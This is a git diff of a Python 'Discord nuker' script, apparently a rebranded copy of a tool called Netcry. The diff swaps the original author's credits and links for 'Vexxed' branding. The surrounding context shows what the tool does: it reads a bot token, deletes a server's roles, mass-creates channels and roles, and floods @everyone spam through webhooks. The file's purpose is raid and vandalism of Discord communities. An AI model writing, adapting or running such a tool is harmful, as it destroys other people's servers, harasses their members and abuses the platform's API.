@@ -8,7 +8,7 @@ import threading
 # this is nearly as fast as nebula nuker bot lol
 # why are you reading the source code?
 # either you think it is a rat or you are trying to skid it hm
-# property of @a1lw on discord or https://github.com/dropalways
+# property of @wrd2vexxed on discord 
 
 with open("token.txt", "r") as file:
     token = file.readline().strip()
@@ -35,7 +35,7 @@ if themessage == "":
     themessage = "@everyone\n**Netcry was here** <a:trolli:1130231841073414294>\n\nhttps://www.youtube.com/watch?v=jjOhdodxSCc"
 sname = input("Enter new server name [Enter for default]: ")
 if sname == "":
-    sname = "github.com/dropalways/netcry-nuker"
+    sname = "Nuked By Wrd2Vexxed"
 num_channels = 51
 num_messages = 40
 num_roles = 40
@@ -89,7 +89,7 @@ async def delete_all_roles(session):
 
 async def create_roles(session):
     print("Creating roles...")
-    rname = "Netcry on top"
+    rname = "Vexxed on top"
     create_role_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
     create_role_payload = {
         'name': f'{rname}',
@@ -139,12 +139,12 @@ async def create_channels_and_spam(session):
     }
     create_channel_url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
     create_channel_payload = {
-        'name': 'netcry-on-top',
+        'name': 'Vexxed-on-top',
         'type': 0
     }
     create_webhook_url = f'https://discord.com/api/v9/channels/{{channel_id}}/webhooks'
     create_webhook_payload = {
-        'name': 'why are you looking at the webhook name | github.com/dropalways/netcry-nuker',
+        'name': 'why are you looking at the webhook name |Vexxed On Top',
     }
 
     create_tasks = []
@@ -177,7 +177,7 @@ async def spam_webhook(session, webhook_url):
 
     message = {
         "content": f"{themessage}",
-        'username': 'github.com/dropalways/netcry-nuker',
+        'username': 'Nuked By Vexxed',
         "avatar_url": "https://cdn.discordapp.com/emojis/1130231841073414294.gif?size=44&quality=lossless",
         "components": [
             {
@@ -187,7 +187,7 @@ async def spam_webhook(session, webhook_url):
                         "type": 2,
                         "style": 5,
                         "label": "Download",
-                        "url": "https://github.com/dropalways/netcry-nuker"
+                        "url": "https://github.com/OriginalVexxed/NetcryNuker"
                     }
                 ]
             }
